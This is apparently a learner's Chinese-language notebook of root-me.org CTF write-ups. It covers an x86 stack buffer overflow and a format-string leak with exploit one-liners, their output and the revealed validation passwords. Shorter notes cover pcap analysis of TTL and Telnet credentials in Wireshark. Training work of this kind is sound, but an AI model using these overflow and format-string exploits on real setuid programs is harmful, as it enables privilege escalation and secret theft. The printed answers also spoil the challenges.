load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \___ \
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |__) |
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| / __/
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/_____|
                                 |___/ root-me.org

                                     ██▒ ▒██░
                                 ░███░ █ █ ░███▒
                             ░███░        ▓     ███░
                           ▓█▓       ▓█░  ▓       ▓███
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██
                        ██  ███  ▒░       ▓░████░██    ▓█░
                       ██   ▒██      ███      ░▓██      ▒█
                      ██             ░█░      ░██        ▓█
                     ░█████████████    █     ██░          █▓
                     ██                 █ ░██             ██
                     ██      ░         ░██▓               ██
                     ██  ███    ░██▓░███                 ███
                     ▒█          ▓██▓                  ░████
                      █▓    ░████                    ░██ ▒█
                      ▓█████░                      ███ ███▓
                      ▓███                      █████░ ████
                       ▓█     ░██▓░         ▒████████░  ██
                       ▓█      ██░▒██████████████████░  ██
                       ▓█       ███▓██▒  ░██████████░   ██
                       ▓█                  ░████▒       ██
                        ░██▓           ▒█▓           ▒██░
                           ▒██░       ██ ▒█        ██▓
                              █▒                  █
                              █▒  ░█    █░   █▓   █
                              █████████████████████

 ████████████▄                             ██    ███             ███
 ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄

 ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        █
█
 ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ███████████
█
 ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██
 ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀█████████
█
--------------------------------------------------------------------------------
----------------

    Welcome on challenge02    /

-----------------------------‘

/tmp and /var/tmp are writeable

Validation password is stored in $HOME/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, ra
dare2

Attention:
    Publishing solutions publicly (blog, github, youtube, etc.) is forbidden.
    Publier des solutions publiquement (blog, github, youtube, etc.) est interdi
t.

--------------------------------------------------------------------------------
----------------

    Challenge informations   /

----------------------------‘

./ch13: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamic
ally linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=
d2ae5f2bb448364a35f8abfc3d07ce36d5c8f230, not stripped
libc: GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
TH      Symbols                 FORTIFY         Fortified       Fortifiable  FIL
E
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
NPATH   70 Symbols     No       0               2       ./ch13

ASLR is OFF

app-systeme-ch13@challenge02:~$

```

```bash
app-systeme-ch13@challenge02:~$ ll
total 28
dr-xr-x---  2 app-systeme-ch13-cracked app-systeme-ch13 4096 May 19  2019 ./
drwxr-xr-x 18 root                     root             4096 Mar 17  2018 ../
-r--------  1 app-systeme-ch13-cracked app-systeme-ch13   17 Mar 18  2015 .passwd
-r--r-----  1 app-systeme-ch13-cracked app-systeme-ch13  537 May 19  2019 Makefile
-r-sr-x---  1 app-systeme-ch13-cracked app-systeme-ch13 7360 May 19  2019 ch13*
-r--r-----  1 app-systeme-ch13-cracked app-systeme-ch13  555 May 19  2019 ch13.c
```

```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```
```sh
app-systeme-ch13@challenge02:~$ python
Python 2.7.17 (default, Feb 27 2021, 15:10:58)
[GCC 7.5.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

```python 2.7
>>> print "\xef\xbe\xad\xde"
ﾭÞ
```

```bash
app-systeme-ch13@challenge02:~$ python -c 'print "a"*40+"\xef\xbe\xad\xde" + "\x00"*4052 + "cat .passwd"' | ./ch13

[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭÞ
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
1w4ntm0r3pr0np1s
Shell closed! Bye.
```

```bash
app-systeme-ch13@challenge02:~$ (python -c 'print "a"*40+"\xef\xbe\xad\xde" '; cat ) | ./ch13

[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭÞ
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
cat .passwd
1w4ntm0r3pr0np1s
^CShell closed! Bye.

app-systeme-ch13@challenge02:~$

```

这个方法不对
```bash
app-systeme-ch13@challenge02:~$ ./ch13
0000000000000000000000000000000000000000ﾭÞ

[buf]: 0000000000000000000000000000000000000000ﾭÃ
[check] 0xc3adbeef

You are on the right way!
app-systeme-ch13@challenge02:~$

cat .passwd
```

原因在于手打的 ﾭÞ 无法被正确转义，

```sh
app-systeme-ch13@challenge02:~$ 0000000000000000000000000000000000000000ﾭÞ
WARNING:root:could not open file '/etc/apt/sources.list.d/nodesource.list'

0000000000000000000000000000000000000000\udcef\udcbe\udcad\udcc3\udc9e: command not found
app-systeme-ch13@challenge02:~$
```

直接被识别成五个字符了，所以用 python 比较靠谱。

## ELF x86 - Format string bug basic 1

```shell
[Press Shift-F1 for help]

Host/IP or ssh:// URL [localhost]: ssh://app-systeme-ch5:app-systeme-ch5@challen
ge02
Connecting to ssh://app-systeme-ch5@challenge02:22

load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_rsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_dsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ecdsa_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_ed25519_sk": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
load pubkey "/dev/null/.ssh/id_xmss": Not a directory
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \___ \
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |__) |
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| / __/
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/_____|
                                 |___/ root-me.org

                                     ██▒ ▒██░
                                 ░███░ █ █ ░███▒
                             ░███░        ▓     ███░
                           ▓█▓       ▓█░  ▓       ▓███
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██
                        ██  ███  ▒░       ▓░████░██    ▓█░
                       ██   ▒██      ███      ░▓██      ▒█
                      ██             ░█░      ░██        ▓█
                     ░█████████████    █     ██░          █▓
                     ██                 █ ░██             ██
                     ██      ░         ░██▓               ██
                     ██  ███    ░██▓░███                 ███
                     ▒█          ▓██▓                  ░████
                      █▓    ░████                    ░██ ▒█
                      ▓█████░                      ███ ███▓
                      ▓███                      █████░ ████
                       ▓█     ░██▓░         ▒████████░  ██
                       ▓█      ██░▒██████████████████░  ██
                       ▓█       ███▓██▒  ░██████████░   ██
                       ▓█                  ░████▒       ██
                        ░██▓           ▒█▓           ▒██░
                           ▒██░       ██ ▒█        ██▓
                              █▒                  █
                              █▒  ░█    █░   █▓   █
                              █████████████████████

 ████████████▄                             ██    ███             ███
 ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄

 ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        █
█
 ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ███████████
█
 ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██
 ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀█████████
█

--------------------------------------------------------------------------------
----------------

    Welcome on challenge02    /

-----------------------------‘

/tmp and /var/tmp are writeable

Validation password is stored in $HOME/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, ra
dare2

Attention:
    Publishing solutions publicly (blog, github, youtube, etc.) is forbidden.
    Publier des solutions publiquement (blog, github, youtube, etc.) est interdi
t.

--------------------------------------------------------------------------------
----------------

    Challenge informations   /

----------------------------‘

./ch5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamica
lly linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b
c45458fd23fb2c00bd069a9755569b89d35640a, not stripped
libc: GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
TH      Symbols                 FORTIFY         Fortified       Fortifiable  FIL
E
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RU
NPATH   69 Symbols     Yes      0               2       ./ch5

ASLR is OFF

app-systeme-ch5@challenge02:~$
```

```sh
app-systeme-ch5@challenge02:~$ ll
total 28
dr-xr-x---  2 app-systeme-ch5-cracked app-systeme-ch5 4096 May 19  2019 ./
drwxr-xr-x 18 root                    root            4096 Mar 17  2018 ../
-r--------  1 app-systeme-ch5-cracked app-systeme-ch5   14 Feb  8  2012 .passwd
-r--r-----  1 app-systeme-ch5-cracked app-systeme-ch5  507 May 19  2019 Makefile
-r-sr-x---  1 app-systeme-ch5-cracked app-systeme-ch5 7336 May 19  2019 ch5*
-r--r-----  1 app-systeme-ch5-cracked app-systeme-ch5  247 May 25  2015 ch5.c
```

```c
#include <stdio.h>
#include <unistd.h>
 
int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```

```sh
app-systeme-ch5@challenge02:~$ ./ch5 %x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
20,804b160,804853d,9,bffffd38,b7e1b589,bffffc14,b7fc3000,b7fc3000,804b160,39617044,28293664,6d617045,bf000a64,804861b
app-systeme-ch5@challenge02:~$
```

```sh
app-systeme-ch5@challenge02:~$ ./ch5 $(python -c 'print "%08x."*32')
00000020.0804b160.0804853d.00000009.bffffcc4.b7e1b589.bffffba4.b7fc3000.
b7fc3000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.
bffffba4.bffffbb0.c058f800.bffffb10.00000000.00000000.b7e03f21.b7fc3000.
b7fc3000.00000000.b7e03f21.00000002.bffffba4.bffffbb0.bffffb34.00000001.
app-systeme-ch5@challenge02:~$
```

大小端转换

9apD()6dmapE
Dpa9d6)(Epam

http://showlinkroom.me/2017/01/28/pwn-learn-printf/

https://blog.csdn.net/qq_29687403/article/details/46953121

https://1993-constant.tistory.com/513

https://codeby.net/threads/root-me-app-system-elf-x86-format-string-bug-basic-1.67942/

https://itszzz.top/2019/04/12/format-string-bug/#the-format-function-family

大小端 https://www.jianshu.com/p/a147d486c04c

# Réseau

## IP - Time To Live

Énoncé
Retrouvez le TTL employé pour atteindre l’hote ciblé par cet échange de paquets ICMP.

开始这个题目会下载一个名为 ch7.pcap 文件，经查为网络数据包，需要专业工具来打开。

网上比较推荐 wireshark 这种专业工具，去 [Wireshark 官网](https://www.wireshark.org/#download)下载即可，按照步骤安装下来，程序整体比较小。

同时安装程序会告诉你 Wireshark 需要 Npcap 来网络流量抓包，询问你是否需要安装， 以及是否需要装 USBPcap 用于 USB 流量抓包。有需要可以选择安装。

https://medium.com/blacksecurity/root-me-ip-time-to-live-write-up-492ca954ea6b

https://ivanitlearning.wordpress.com/2019/02/12/root-me-ip-determine-ttl/

## TELNET - authentification

Énoncé
Retrouvez le mot de passe de l’utilisateur dans cette capture réseau de session TELNET.

这次文件的名字为 ch2.pcap, 同样用 wireshark 打开解析。

右键 -> 追踪流 -> TCP 流

可以看到内容 Password:user

成功

https://medium.com/secttp/root-me-network-telnet-authentication-1198f2af3efe

# Programmation

## Quick Response Code

https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/rootme/Programming/%5B09%5D%20%5B40P%5D%20Quick%20Response%20Code


# Cracking

## Bash - VM

提示语 MaSHine Virtuelle

Énoncé
Retrouvez le mot de passe de validation stocké dans cette machine virtuelle Bash.

官方参考：
[Introduction à la Programmation en Bash](http://repository.root-me.org/Programmation/Shell/FR%20-%20Introduction%20%C3%A0%20la%20Programmation%20en%20Bash.pdf)

# 参考网站

https://pipedream.com/requestbin

https://blog.csdn.net/lyy289065406/article/details/86446176

https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/rootme/Web-Client

https://challenge-friang.gitbook.io/challenge-brigitte-friang/
